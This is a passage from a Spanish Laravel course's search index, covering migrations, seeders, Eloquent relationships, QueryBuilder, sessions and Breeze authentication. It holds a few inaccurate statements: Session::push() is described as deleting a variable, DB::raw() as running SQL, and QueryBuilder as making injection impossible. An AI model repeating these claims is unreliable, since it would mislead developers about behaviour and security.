encarga de crear la tabla en la base de datos. | down() → se ejecuta cuando se cancela la migración. Se encarga de eliminar la tabla de la base de datos. | . Paso 3: Editar el fichero /database/migrations/20221226072434createclientstable.php: . En el método up() tienes que indicar las columnas que tendrá la tabla. Por ejemplo: . public function up() { Schema::create('clients', function (Blueprint $table) { $table-&gt;bigIncrements('id')-&gt;index();// UNSIGNED BIGINT AUTOINC. $table-&gt;string('name',75)-&gt;unique(); // VARCHAR $table-&gt;text('address')-&gt;nullable(); // TEXT $table-&gt;integer('level'); // INT $table-&gt;date('brith_date'); // DATE // La siguiente línea crea campos created_at y updated_at. Si la borras // esos campos no existirán en tu tabla $table-&gt;timestamps(); }); } public function down() { Schema::drop('clients'); } . Paso 4: Lanzar las migraciones. $ php artisan migrate . Esto creará las tablas que no se hayan creado aún. Es decir, si una migración ya se ha lanzado con anterioridad, no se vuelve a ejecutar para no perder los datos que pudieran existir en esas tablas. Paso 5: Revertir las migraciones (si es necesario) . Si necesitas revertir la creación de todas las tablas: . $ php artisan migrate:rollback . Para revertir solo el último paso en la creación de tablas: . $ php artisan migrate:rollback --step=1 . Para dejar la BD a su estado original (vacía): . $ php artisan migrate:reset . ¡Cuidado! Estas acciones son destructivas. Pero, por supuesto, hay una forma de modificar una tabla sin borrarla y volver a crearla. Es lo que vamos a hacer a continuación. 5.10.2. Modificar tablas mediante migraciones . Si necesitas modificar una tabla que ya existe (por ejemplo, para añadir o eliminar campos), tienes dos opciones: . | Modificar la migración original (en la que se crea la tabla) para añadir o eliminar el campo afectado. Esto te obligará a lanzar la migración de nuevo y, por lo tanto, la tabla se reconstruirá y todos los datos que pudiera contener se perderán. | Crear una nueva migración en la que únicamente se haga la modificación de la tabla, sin tocar el resto. Esto respetará los datos que la tabla ya pudiera contener. | . Como es lógico, la opción 2 será la que preferiremos si la aplicación ya está en producción y necesitamos modificar la estructura de la base de datos. En cambio, durante el desarrollo, puede ser más simple utilizar la opción 1. Supongamos que queremos añadir un campo email a la tabla Clients del apartado anterior. Si optas por la opción 2, es decir, por crear una nueva migración que se encargue de hacer esa modificación en la tabla sin alterar sus datos, la forma de proceder es la siguiente: . Paso 1. Crear la migración: . $ php artisan make:migration add_email_to_clients --table=clients . (Nota: puedes asignar el nombre que quieras a las migraciones, pero Laravel aconseja utilizar las convenciones que ves en estos ejemplos para simplificarnos la vida) . Paso 2: Editar la migración /database/migration/add_email_to_clients.php para añadir, en el método up(), el campo nuevo; y, en el método down(), especificaremos qué hay que hacer en caso de que se fuerce un rollback de esta migración: . public function up() { Schema::table('clients', function (Blueprint $table) { $table-&gt;string('email')-&gt;after('address'); }); } public function down() { Schema::table('clients', function (Blueprint $table) { $table-&gt;dropColumn('email'); }); } . 5.10.3. Otras operaciones en las migraciones . Las migraciones pueden usarse para cualquier otra operación sobre la estructura de la base de datos, como: . | Cambiar tipos de columnas. | Cambiar atributos de columnas (null, unique, default…) | Cambiar o asignar claves primarias y ajenas. | . Las migraciones construídas de este modo nos permitirán reproducir la base de datos en cualquier servidor o actualizarla en cualquier momento sobre una aplicación en producción sin necesidad de programar parches o exportar la BD a un archivo SQL para importarlo en otro servidor. Como te dije al principio, solo el que ha hecho alguna vez alguna de estas cosas a mano sabe la cantidad de trabajo que las migraciones ahorran en el mantenimiento de una aplicación y la asombrosa cantidad de errores embarazosos que evita. Más info en: https://laravel.com/docs/8.x/migrations . 5.10.4. Seeding . El seeding es una técnica adicional a la de las migraciones que permite cargar con datos las tablas de la base de datos. Es muy práctico en estos supuestos: . | Si quieres tener un conjunto de datos de prueba en tu base de datos de desarrollo, esa que destrozas periódicamente cuando haces pruebas. Con un solo comando, tendrás la base de datos reconstruída después de cada destrozo. | Si necesitas cargar algunos datos mínimos en algunas tablas para que la aplicación, una vez desplegada en un servidor de producción, funcione (por ejemplo, para crear un usuario administrador en la tabla Users o para crear algunas entradas en una tabla Options). | . Para crear un seeder (por ejemplo, para la tabla users), sigue estos pasos: . Paso 1. Ejecuta el comando: . $ php artisan make:seeder UsersTableSeeder . Paso 2. Edita el archivo /database/seeds/UsersTableSeeder.php y añade algo como esto al método up() (por supuesto, modifica el código para adaptarlo a tu tabla y a tus datos): . public function run() { Users::truncate(); // Opativo: vacía la tabla antes de rellenarla DB::table('users')-&gt;insert([ 'name' =&gt; 'Stephen Falken', 'address' =&gt; 'Oregon 97, Goose Island', 'email' =&gt; 'sfalken@norad.com', 'brith_date' =&gt; '1932-09-03', ]); DB::table('users')-&gt;insert([ 'name' =&gt; 'Jennifer Mack', 'address' =&gt; 'Richmond Av 3385, Seattle', 'email' =&gt; 'jenmack876@gmail.com', 'brith_date' =&gt; '1967-01-28', ]); } . Paso 3. Ejecuta este comando para lanzar el seeder y que los datos se carguen en tu tabla: . $ php artisan db:seed --class=UsersTableSeeder . Esto cargará solo dos registros en la tabla users. Si quieres más, solo tienes que crear nuevas líneas insert() en el método up(). 5.10.4. Automatizar el seeding . Lanzar los seeders de uno en uno puede ser muy tedioso. Puedes lanzar varios seeders con un solo comando si haces lo siguiente: . Paso 1. Edita el fichero /database/seeds/DatabaseSeeder.php . Paso 2. Añade a la función run() una línea como esta por cada seeder que quieras ejecutar automáticamente: . $this-&gt;call(UsersTableSeeder::class); . Paso 3. ¡Y listo! Al ejecutar el comando db:seed de Artisan, sin indicar la clase, se lanzarán todos los seeders que hayas añadido a run(). $ php artisan db:seed . 5.10.5. Lista de comandos superútiles para manejar migraciones . Por último, te muestro un resumen con los comandos más útiles sobre migraciones y seeders para que puedas consultarlos cuando lo necesites: . | Lanzar todas las migraciones pendientes: . $ php artisan migrate . | Crear la migración para crear una tabla: . $ php artisan make:migration &lt;nombre&gt; --create=&lt;tabla&gt; . | Crear una migración para modificar una tabla ya existente: . $ php artisan make:migration &lt;nombre&gt; --table=&lt;tabla&gt; . | Retroceder un paso en todas las migraciones: . $ php artisan migrate:rollback . | Retroceder N pasos en todas las migraciones: . $ php artisan migrate:rollback --step=&lt;N&gt; . | Deshacer todas las migraciones que se hayan ejecutado hasta ahora (resetear la base de datos): . $ php artisan migrate:reset . | Resetear la base de datos y volver a reconstruirla lanzando todas las migraciones: . $ php artisan migrate:refresh . | Resetear la base de datos, reconstruirla y llenarla de datos con los seeders: . $ php artisan migrate:refresh --seed . | Eliminar todas las tablas y lanzar todas las migraciones de nuevo: . $ php artisan migrate:fresh . | Eliminar todas las tablas y lanzar todas las migraciones y todos los seeders de nuevo: . $ php artisan migrate:fresh --seed . | . ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/migraciones.html#510-migraciones",
    "relUrl": "/laravel/migraciones.html#510-migraciones"
  },"64": {
    "doc": "5.10 Migraciones",
    "title": "5.10 Migraciones",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/migraciones.html",
    "relUrl": "/laravel/migraciones.html"
  },"65": {
    "doc": "5.11 Usando la BD con Eloquent",
    "title": "5.11. Usando la BD con Eloquent",
    "content": ". | 5.11.1. ¿Qué es el mapeo objeto-relacional? | 5.11.2. ¿Cómo puedo usar Eloquent en mi aplicación? | 5.11.3. Pero ¿cómo sabe Laravel qué tabla está asociada a ese modelo? | 5.11.4. Consultas con Eloquent | 5.11.5. Inserciones y borrados con Eloquent | 5.11.6. Lista de los métodos más útiles de Eloquent | 5.11.7. Relaciones entre tablas con Eloquent | . Eloquent uno de los componentes de Laravel que permiten al desarrollador manipular los datos de la BD sin rebajarse a escribir sucio SQL. Y lo consigue mediante un mecanismo simple y elegante: el mapeo objeto-relacional. En esta sección vamos a ver qué es eso del mapeo y cómo sacarle a Eloquent el máximo partido para que nuestros modelos se programen prácticamente solos. 5.11.1. ¿Qué es el mapeo objeto-relacional? . Eloquent no es más que una librería incluida con Laravel que utiliza un patrón de software llamado ORM (Object-Relational Mapping) para abstraer aún más el acceso a la base de datos, de manera que no tengamos que escribir y depurar SQL. Mapear los objetos de nuestra aplicación con una BD relacional significa que Eloquent convierte los registros de tus tablas en objetos de tu aplicación para que los manipules con mayor facilidad. Sí, lo has entendido bien: podrás manejar los datos de tu base de datos como si fueran objetos de tu aplicación. Y, cuando los modifiques, borras o crees, se ejecutará el código SQL necesario (sin que tú te enteres) para traducir esas operaciones en sentencias para la base de datos. Te lo muestro con un ejemplo. Imagina que tenemos una tabla de artículos de un blog. La llamaremos Articles, y tendrá 3 campos: el id (entero), el title (cadena de caracteres) y el body (cadena de caracteres). Con Eloquent, usar esa tabla es tan fácil como hacer algo así: . $art = Article::find('7'); // Buscamos un artículo por su id echo $art-&gt;title; // Ahora podemos acceder a los campos de ese artículo $art-&gt;body = \"Texto del cuerpo\"; // O también podemos modificar los campos del artículo $art-&gt;save(); // Si hacemos save(), los cambios se guardan en la BD . 5.11.2. ¿Cómo puedo usar Eloquent en mi aplicación? . Tienes que crear un modelo. ¿Qué te creías? Pero con Artisan es así de fácil: . $ php artisan make:model &lt;Mi-modelo&gt; . Por ejemplo: . $ php artisan make:model Article . El modelo se creará en /app/models/Article.php (¡cuidado! En versiones más antiguas de Laravel, el modelo se creará en /app/Article.php) . Truco: si creas el modelo con la opción -m, se creará atomáticamente su migración, lo cual resulta tremendamente práctico: . $ php artisan make:model Article -m . Ya tienes tu modelo. Si no puedes contener tu curiosidad insaciable y lo abres, verás un archivo bastante decepcionante con este aspecto: . &lt;?php namespace App\\Models; use Illuminate\\Database\\Eloquent\\Factories\\HasFactory; use Illuminate\\Database\\Eloquent\\Model; class Article extends Model { use HasFactory; } . ¿Y eso es todo? . Pues sí, eso es todo. La gracia está en ese “extends Model” de la definición de la clase: aunque tu modelo Article parezca vacío, en realidad acaba de heredar un mogollón de características útiles de la clase Model. Entre otras, todos los métodos de Eloquent. 5.11.3. Pero ¿cómo sabe Laravel qué tabla está asociada a ese modelo? . Buena pregunta. Laravel supondrá que la tabla se llama igual que el modelo, solo que en minúscula y plural. Es decir, la tabla de la base de datos asociada al modelo Article se debería llamar articles. Recuerda que en Laravel existen un montón de convenciones sobre los nombres de las cosas que conviene respetar, más que nada porque te facilitan mucho la vida y hacen que te centres en lo verdaderamente importante (crear el código de tu aplicación) en lugar de en lo accesorio (pelearte con los nombres). No obstante, si quieres ponerle otro nombre a la tabla, puedes hacerlo. También puedes cambiar otras muchas cosas, como el nombre del campo clave (Laravel supondrá que se llama id) o los campos sobre los que se puede hacer una asignación masiva, algo muy útil que veremos un poco más adelante. Por ejemplo, podemos editar el modelo /app/Articles.php y añadir estas líneas dentro de nuestra clase: . protected $table = 'articulos'; // El nombre de la tabla no será \"articles\" sino \"articulos\" protected $primaryKey = 'id_art'; // La clave primaria no será \"id\" sino \"id_art\" protected $fillable = array('id','titulo','cuerpo'); // Campos de la tabla en los que se permite la ASIGNACIÓN MASIVA (más adelante veremos qué es esto) . 5.11.4. Consultas con Eloquent . Solo con construir el modelo (y asignarlo a la tabla adecuada) ya tenemos detrás a Eloquent haciendo el mapeo objeto-relacional. Ahora podemos ir a nuestro controlador (que, por respetar las convenciones de Laravel, debería llamarse ArticlesController) y lanzar consultas con expresiones como estas: . $articlesList = Article::all(); // Devuelve todos los artículos $myArticle = Article::find($id); // Devuelve el artículo con ese $id $myArticle = Article::findOrFail($id); // Error 404 si el artículo no existe $articlesList = Article::where('id', '&gt;', 100)-&gt;get(); // Select con where $articlesList = Article::where('id', '&gt;', 100)-&gt;take(10)-&gt;get(); // Select con where y take $maxId = Article::max('id'); // Devuelve el último id asignado . A lo mejor hay algo que te está chirriando. Si escribimos cosas como estas en el controlador, ¿no significa eso que estamos lanzando consultas desde el controlador? Y eso está prohibidísimo en la arquitectura MVC. ¿Es que Laravel no respeta la arquitectura MVC? . Hay quien dice que sí, hay quien dice que no y hay quien dice que psé, psé. En realidad, no estamos escribiendo SQL en el controlador, ni estamos accediendo a la base de datos de ninguna manera explícita. Cuando lanzamos un Article::find($id) desde el controlador, por ejemplo, no sabemos qué ocurre por debajo ni de dónde se extrae la información: nos limitamos a acceder a una de nuestras clases y obtener de ella un objeto de tipo Article. 5.11.5. Inserciones y borrados con Eloquent . También podemos usar Eloquent para insertar un nuevo artículo desde nuestro controlador: . $art = new Article; $art-&gt;title = 'Los Chitauri invaden Nueva York'; $art-&gt;body = 'Bla, bla, bla'; $art-&gt;save(); . Si los datos del artículo vienen de un formulario, fíjate en lo alucinantemente fácil que es recoger todos esos datos, crear un objeto Article con ellos y guardar el artículo en la BD: . public function store(Request $request) { Article::create($request-&gt;all()); // Esto es una ASIGNACIÓN MASIVA de las que hablábamos más arriba!! return view('la-vista-que-sea'); } . Ojo: solo los campos que hayas indicado como fillables en el modelo se podrán asignar al artículo de este modo. Eso es lo que significa asignación masiva. Y, por supuesto, también podemos modificar y borrar artículos de la base de datos: . $art = Article::find(18); // MODIFICAR $art-&gt;body = 'Nuevo cuerpo'; $art-&gt;save(); $art = Article::find(13); // BORRAR $art-&gt;delete(); . 5.11.6. Lista de los métodos más útiles de Eloquent . Hemos visto en los últimos ejemplos algunos métodos de Eloquent por separado. Te los reúno en esta sección para que los puedas consultar cuando lo necesites. Aviso: no están todos, solo los de uso más habitual. Si quieres una lista completa, ya sabes: acude a la documentación oficial. | all() → Recupera todos los registros de una tabla. | where(“campo”, valor) → Aplica claúsula where. | orderBy(“campo”, “asc|desc”) → Aplica claúsula order by. | get() → Recupera registros seleccionados. Se suele usar con where y/o order by: Ciudades::where(\"ciudad\", \"Madrid\")-&gt;orderBy(\"id\", \"asc\")-&gt;get(); . | first() → Recupera el primer registro. | latest() → Recupera el último registro. | find(valor) → Busca registros con ese valor en el campo id. | findOrFail(valor) → Lanza un error 404 si no encuentra el registro. | count(), max(), min()… → Utiliza funciones de agregado de SQL. | save() → Inserta o actualiza registros. | update() → Actualiza registros. | delete() → Elimina registros. | . 5.11.7. Relaciones entre tablas con Eloquent . Las relaciones entre tablas también se pueden manejar con Eloquent sin necesidad de andar escribiendo larguísimos INNER JOIN y otros miembros de su nutrida familia, con todos los errores de escritura que suelen hacernos perder el tiempo depurando SQL. Aunque al principio te parezca que definir las relaciones entre tablas con Eloquent necesita mucho trabajo previo, te garantizo que después te alegrarás de haberlo hecho. Porque las relaciones, una vez definidas, se comportan como consultas y se puede operar con ellas como si lo fueran. Lo comprenderemos mejor, como siempre, con ejemplos. En los siguientes apartados, vamos a suponer que tenemos estas tablas: . | usuarios(id#, nombre, passwd) | emails(id#, email, usuario_id) → Esta tabla tiene una relación 1:1 con usuarios | articulos(id#, titulo, texto, idUsuario) → Esta tabla tiene una relación 1:N con usuarios | roles(id#, nombre) → Esta tabla tiene una relación N:N con usuarios | . ATENCIÓN: en la tabla artículos hemos usado a propósito un nombre no estándar para la clave foránea. Para respetar la convención de Laravel, debería llamarse usuario_id en lugar de idUsuario, como en la tabla emails. 5.11.7.1. Relaciones 1:1 (usuarios &lt;-&gt; emails) . Para definir un relación 1:1 con Eloquent debes hacer lo siguiente: . Paso 1. En el modelo de la tabla maestra (clase Usuario, en nuestro ejemplo) añadimos este método: . public function email() { return $this-&gt;hasOne('App\\Email'); } . Paso 2. En el modelo de la tabla relacionada (clase Email) añadimos este método: . public function usuario() { return $this-&gt;belongsTo('App\\Usuario'); } . A partir de ahora, se puede recuperar el email de un usuario como si fuera un miembro de la clase Usuario, tan sencilla como esto: . $email = Usuario::find(1)-&gt;email; $user = Email::all()-&gt;first()-&gt;user; . Y también funciona al revés. Es decir, a partir de un objeto de tipo Email, podemos acceder a su usuario como si fuera un atributo de la clase Email. 5.11.7.2. Relaciones 1:N (usuarios &lt;-&gt; artículos) . Si tienes una relación 1:N (como la que hay entre las tablas de usuarios y artículos de nuestro ejemplo), para definirla en Eloquent tienes que hacer esto: . Paso 1. En el modelo de la tabla maestra (clase Usuario), añade este método: . public function articulos() { return $this-&gt;hasMany('App\\Articulo', 'idUsuario'); } // ATENCIÓN: hemos tenido que indicar el nombre de la clave foránea // (idUsuario) porque no habíamos respetado la convención de Laravel // (usuario_id) al crear la tabla de artículos . Paso 2. En el modelo de la tabla relacionada (class Articulo), añade este otro método: . public function usuario() { return $this-&gt;belongsTo('App\\Usuario'); } . ¡Y listo! Ya puedes recuperar los artículos a partir del usuario, como si fueran atributos de esa clase. Y a la inversa también funciona. Por ejemplo: . $articulos = Usuario::find(1)-&gt;articulos; foreach ($articulos as $articulo) { // Procesar cada artículo } . 5.7.11.3. Relaciones N:N (usuarios &lt;-&gt; roles) . Si lo que tienes es una relación N:N (como la que hay entre usuarios y roles en nuestro ejemplo), los pasos a seguir para construirla con Eloquent son estos: . Paso 1. En el modelo de una de las tablas (clase Usuario) añadimos este método: . public function roles() { return $this-&gt;belongsToMany('App\\Rol'); } . Paso 2. En el modelo de la otra tabla (clase Rol) añadimos este método: . public function usuarios() { return $this-&gt;belongsToMany('App\\Usuario'); } . Ahora, ya se pueden recuperar los roles a partir del usuario o a la inversa. Por ejemplo: . $roles = Usuario::find(1)-&gt;roles; foreach ($roles as $rol) { // Procesar cada rol } . 5.7.11.4. La tabla pivote: insertar, modificar y borrar en relaciones N:N . Insertar, modificar y borrar en relaciones N:N implica escribir datos (normalmente, ids) en la tabla intermedia o tabla pivote, lo cual suele suponer un engorro cuando se hace a mano con SQL. Ese tedioso proceso también se puede automatizar con Eloquent. Lo vemos con un ejemplo entre nuestras tablas usuarios y roles. Para insertar un usuario y sus roles se usa el método attach(): . public function store(Request $r) { $user = new User($r-&gt;all()); $user-&gt;roles()-&gt;attach($r-&gt;roles); $user-&gt;save(); } . Para actualizar un usuario y sus roles se usa el método sync(): . public function update(Request $r, $id) { $user = User::find($id); $user-&gt;fill($r-&gt;all()); $user-&gt;roles()-&gt;sync($r-&gt;roles); $user-&gt;save(); } . Para eliminar un usuario y sus roles se usa el método detach(): . public function destroy($id) { $user = User::find($id); $user-&gt;roles()-&gt;detach(); $user-&gt;delete(); } . 5.7.11.5. Problemas frecuentes en relaciones N:N . Eloquent supondrá que el nombre de la tabla de la relación se ha formado con los nombres de las dos tablas maestras en snake case y ordenadas alfabéticamente. Por ejemplo, en la relación N:N entre usuarios y roles, Eloquent supondrá que existe una tabla llamada roles_usuarios. Si no se llama así, la relación fallará. Se puede indicar otro nombre de tabla al definir la relación. Por ejemplo, en el modelo de usuarios (clase Usuario): . public function roles() { return $this-&gt;belongsToMany('App\\Rol', 'usuarios_roles'); } . También se pueden indicar los nombres de las claves foráneas si no siguen las convenciones (que, según Laravel, son usuario_id, rol_id, etc) . public function roles() { return $this-&gt;belongsToMany('App\\Rol', 'usuarios_roles', 'id_usuario', 'id_rol'); } . ¿Te has fijado en que hemos creado un método para acceder a la tabla relacionada, pero estamos usando un atributo en su lugar? . public function articulos() { return $this-&gt;hasMany('App\\Articulo'); } public function loQueSea() { $arts = Usuario::find(1)-&gt;articulos; // articulos, no articulos() } . Pues bien, el atributo articulo es un atributo virtual creado por Eloquent. Pero el método articulos() también existe, y puede usarse como una consulta, extendiéndola como necesitemos. Por ejemplo: . $arts = Usuario::find(1)-&gt;articulos()-&gt;where('titulo','foo')-&gt;first(); . ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/eloquent.html#511-usando-la-bd-con-eloquent",
    "relUrl": "/laravel/eloquent.html#511-usando-la-bd-con-eloquent"
  },"66": {
    "doc": "5.11 Usando la BD con Eloquent",
    "title": "5.11 Usando la BD con Eloquent",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/eloquent.html",
    "relUrl": "/laravel/eloquent.html"
  },"67": {
    "doc": "5.12 Usando la BD con QueryBuilder",
    "title": "5.12. Usando la BD con QueryBuilder",
    "content": ". | 5.12.1. ¿Qué es y cómo se utiliza QueryBuilder? | 5.12.2. Colecciones | 5.12.3. Ventajas de QueryBuilder sobre SQL | 5.12.4. Relaciones entre tablas con QueryBuilder | 5.12.5. SQL crudo | . En esta sección te voy a presentar a QueryBuilder, otra forma de acceder a la base de datos desde Laravel que te resultará muy útil en aquellos casos en los que, por la razón que sea, los métodos de Eloquent no sean suficientes. 5.12.1. ¿Qué es y cómo se utiliza QueryBuilder? . Eloquent permite usar la BD de forma simple y elegante en la mayor parte de las circunstancias. Aún así, puede haber situaciones en las que queramos un acceso de más bajo nivel a la BD. Para eso existe QueryBuilder. El grado de abstracción de QueryBuilder es mucho menor que el de Eloquent. Es decir, estaremos CASI escribiendo SQL, sin llegar a hacerlo. Algunos ejemplos de uso te darán una pista de qué tipo cosas se pueden hacer con QueryBuilder: . $users = DB::table(\"users\")-&gt;get(); $users = DB::table(\"users\")-&gt;where(\"name\", \"=\", \"Ana\")-&gt;first(); $users = DB::table(\"users\")-&gt;where(\"edad\", \"&gt;=\", 18)-&gt;orderBy(\"apellidos\"); $maxId = DB::table(\"users\")-&gt;max(\"id\"); $existe = DB::table(\"users\")-&gt;where(\"id\", \"=\", $id)-&gt;exists(); $users = DB::table(\"users\")-&gt;select(\"nombre, apellidos as apell\")-&gt;get(); . Ahora ves a qué me refiero cuando digo que QueryBuilder es casi SQL, sin llegar a serlo. No tendrás que depurar el SQL, ni pelearte con comillas que se abren y cierran, ni nada de eso. QueryBuilder generará el SQL por ti a partir de expresiones como las que acabas de ver. En la documentación oficial encontrarás una referencia completa de todas las funciones de QueryBuilder, pero con estas que ves en el ejemplo puedes construir prácticamente cualquier consulta sencilla. 5.12.2. Colecciones . El resultado de consultas como las que veíamos de ejemplo en el apartado anterior es bastante intuitivo: . | O bien un dato simple (como el $maxId de la cuarta consulta, que es un entero). | O bien un objeto de tipo Collection. | . Las colecciones de Laravel tienen un montón de métodos útiles para procesarlas y puedes echarle un vistazo a la documentación oficial para ello, pero la mayor parte de las veces basta con hacer un foreach sobre la variable para ir accediendo a cada uno de los elementos, que se comportarán como objetos del tipo adecuado. Por ejemplo, para acceder a todos los registros de la tabla de usuarios: . $users = DB::table(\"users\")-&gt;get(); foreach ($users as $user) { echo $user-&gt;name; echo $user-&gt;email; ...etc... } . 5.12.3. Ventajas de QueryBuilder sobre SQL . Como ves, QueryBuilder te permite construir sentencias SQL sin necesidad de escribir SQL. La ventaja de esto es triple: . | No tendremos que depurar nuestros errores sintácticos en SQL, con el ahorro de tiempo que eso conlleva. | El SQL generado será 100% compatible con el gestor de base de datos que estemos utilizando. Si escribimos SQL en crudo, tendremos que adaptarlo al dialecto de nuestro gestor de base de datos. Y, si cambiamos de gestor, habrá que revisar todas las sentencias SQL para adaptarlas de nuevo. Todo esto lo evita QueryBuilder, puesto que hace esa adaptación por nosotros. | Es imposible que suframos un ataque por inyección de código, puesto que QueryBuilder no lo permitirá. | . 5.12.4. Relaciones entre tablas con QueryBuilder . Las relaciones entre tablas se manejan con joins, como en SQL, solo que escritos al estilo QueryBuilder. Para hacer un INNER JOIN, puedes usar como referencia este ejemplo: . $users = DB::table('users') -&gt;join('contacts', 'users.id', '=', 'contacts.user_id') -&gt;join('orders', 'users.id', '=', 'orders.user_id') -&gt;select('users.*', 'contacts.phone', 'orders.price') -&gt;get(); . Por supuesto, también puedes hacer LEFT JOIN y RIGHT JOIN: . $resultado = DB::table('A')-&gt;leftJoin('B'...); $resultado = DB::table('A')-&gt;rightJoin('B'...); . 5.12.5. SQL crudo . Por último, QueryBuilder también te permite escribir SQL crudo, es decir, SQL tal cual, si es que alguna vez lo necesitas. Eso sí, deberías valorar muy bien para qué narices quieres escribir SQL crudo. ¿Estás seguro/a de que eso que intentas hacer no se puede lograr más fácilmente con Eloquent o con QueryBuilder? . Además, tendrás que extremar las precauciones ante un posible ataque por inyección de código. Si aún así no te he convencido, puedes ejecutar tu SQL crudo así: . $resultado = DB::raw('escribe-aquí-tu-sentencia-SQL'); . ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/querybuilder.html#512-usando-la-bd-con-querybuilder",
    "relUrl": "/laravel/querybuilder.html#512-usando-la-bd-con-querybuilder"
  },"68": {
    "doc": "5.12 Usando la BD con QueryBuilder",
    "title": "5.12 Usando la BD con QueryBuilder",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/querybuilder.html",
    "relUrl": "/laravel/querybuilder.html"
  },"69": {
    "doc": "5.13 Sesiones con Laravel",
    "title": "5.13. Sesiones con Laravel",
    "content": ". | 5.13.1. Drivers de sesión | 5.13.2. Persistencia de las variables de sesión | 5.13.3. Autenticación | 5.13.4. Laravel Breeze | 5.13.5. Autenticación y vistas: cómo generar código dependiendo del tipo de usuario | 5.13.6. Autenticación y middlewares: cómo proteger los controladores | . Como es lógico, Laravel también proporciona su propio sistema de manejo de variables de sesión, es decir, variables persistentes en el servidor asociadas a cada cliente. Las variables de sesión de Laravel son mucho más seguras y poderosas que las variables de sesión estándar de PHP. En esta sección vamos a ver cómo funcionan y qué posibilidades nos ofrecen las sesiones en Laravel. 5.13.1. Drivers de sesión . Las sesiones de configuran en /config/sessions.php, y una de las cosas que debes configurar ahí es el driver de sesión, es decir, el tipo de manejador que quieres que manipule las sesiones. | Files: . El driver por defecto es files. Es el más sencillo y funcionará en casi cualquier servidor. Eso significa que Laravel guardará las variables de sesión en un fichero especial en el servidor (que nosotros no tenemos que manejar: Laravel se encargará de todo). | Memcached y redis: . El driver files es más que suficiente para una aplicación en desarrollo, pero para una aplicación en producción, Laravel recomienda usar otros drivers llamados memcached o redis porque son más rápidos. Ambos son daemons del sistema programados para esta tarea. Obviamente, el servidor debe soportarlos para que puedas usarlos. Consulta con tu proveedor o con tu administrador de sistemas la configuración de tu servidor web para saber si puedes usar alguno de estos dos drivers. Si no, tendrás que conformarte con files. | Database: . Si necesitas seguridad adicional, sin duda tu driver es database. Esto almacenará dos copias de cada variable de sesión: una en un fichero y otra en una tabla especial de la base de datos. Si un atacante consiguiera manipular una de las dos variables, Laravel cerrará la sesión automáticamente y el atacante se quedará con un palmo de narices. Eso sí, este sistema es el más lento de todos porque requiere un acceso a la base de datos para cada petición al servidor. | . 5.13.2. Persistencia de las variables de sesión . Laravel maneja dos tipos de variable según su persistencia: . | Variables flash: solo duran una petición y luego desaparecen. | Variables de sesión convencionales: existen hasta que las destruimos expresamente. | . Variables flash . Son variables de sesión que solo duran una petición y luego se autodestruyen. Se usan típicamente para enviar un feedback o mensaje de retroalimentación al usuario. Te lo muestro con un ejemplo. Imagina el típico formulario de login. En caso de producirse un error, lo habitual es que la aplicación nos muestre de nuevo ese formulario con un mensaje del tipo de “Usuario no reconocido”. Para lograr eso, haríamos lo siguiente en el controlador. Observa el uso del método with() para crear una variable flash de sesión llamada mensaje: . return ('login/form')-&gt;with('mensaje', 'Usuario no reconocido'); . En la vista, podemos acceder a esa variable flash. Por ejemplo, así: . @if (session('mensaje')) {{ session('mensaje'); }} @endif . A partir de este momento, la variable flash se destruye y cualquier intento de acceder a ella provocará un error de ejecución. Variables de sesión convencionales . Las variables de sesión convencionales se manejan con la clase Session, que tiene un montón de métodos estáticos para crear variables, destruirlas, consultarlas, etc. Los métodos más útiles son: . | put() -&gt; almacena una variable de sesión: . Session::put('nombre-variable', 'valor'); . | push() -&gt; elimina una variable de sesión: . Session::push('nombre-variable'); . | get() -&gt; devuelve el valor de una variable de sesión: . $v = Session::get('nombre-variable'); $v = Session::get('nombre-variable', 'valor-por-defecto'); . | all() -&gt; devuelve todas las variables de sesión en un array: . $a = Session::all('nombre-variable', 'valor'); . | flush() -&gt; elimina todas las variables de sesión: . Session::flush(); . | flash() -&gt; crea manualmente una variable de sesión de tipo flash: . Session::flash('nombre-variable', 'valor'); . | . 5.13.3. Autenticación . La autenticación de usuarios, es decir, el sistema de login seguido de la creación de una o varias variables de sesión asociadas al usuario que se acaba de loguear, es un componente habitual de muchas aplicaciones web. Hasta la versión 5, Laravel proporcionaba un sistema de autenticación integrado en su código que se podía añadir a nuestra aplicación con un simple comando de Artisan. Pero a partir de Laravel 6, los desarrolladores decidieron aligerar el núcleo de Laravel lo máximo posible, y sacaron del sistema muchos componentes, incluyendo el sistema de autencicación. Actualmente, Laravel proporciona los denominados Starter Kits, que son componentes que se pueden instalar mediante composer para realizar esas tareas que se extrajeron del núcleo de Laravel. Para la autenticación, Laravel dispone de dos Starter Kits, llamados Breeze y Jetstream. Vamos a ver el primero, que es más sencillo pero suficiente en la mayor parte de las situaciones. 5.13.4. Laravel Breeze . Larevel Breeze contiene todo el código necesario para crear un sistema de autenticación completo y seguro capaz, entre otras cosas, de: . | Hacer el Login e iniciar la sesión | Registrar nuevos usuarios | Recuperar contraseñas olvidadas | Confirmaar el registro de usuarios mediante email | . Para instalar Laravel Breeze, debes abrir un terminal en tu servidor web y ejecutar estos comandos: . $ composer require laravel/breeze --dev $ php artisan breeze:install $ npm install $ npm run dev $ php artisan migrate . El primer comando instalará las librerías PHP necesarias para que Laravel Breeze se ejecute. El segundo, añadirá Breeze a tu aplicación, creando automáticamente varios controladores, modelos, vistas y hasta migraciones. Los dos comandos npm sirven para compilar el CSS y el JS de Breeze, de manera que funcione más rápido. Por último, actualizamos las migraciones para que se creen las tablas adicionales que Breeze va a necesitar. Una vez hecho esto, Breeze creará automáticamente varias rutas en un enrutador especial, /routes/auth.php. Entre ellas: . Routes::get(\"/login\") → Para mostrar el formulario de login Routes::post(\"/login\") → Para procesar el formulario de login Routes::post(\"/logout\") → Para cerrar la sesión Routes::get(\"/register\") → Para mostrar el fomulario de registro Routes::post(\"/register\") → Para procesar el formulario de registro . Puedes probarlas escribiéndolas en tu navegador. Comprobarás que funcionan estupendamente. También se crearán varios controladores como LoginController y RegisterContoller. Los puedes encontrar en App/Http/Controllers/Auth. Y, por supuesto, se crean varias vistas, como auth/login.blade.php, register.blade.php y layouts/app.blade.php (la plantilla que usarán login y register). Por último, se crea una vista home de ejemplo (dashboard.blade.php) a la que llegamos después de hacer login. Esa vista home la puedes cambiar en /app/providers/RouteServiceProvider.php para redirigirla a la vista que te interese. ¡Y listo! Ya tienes hecho un sistema 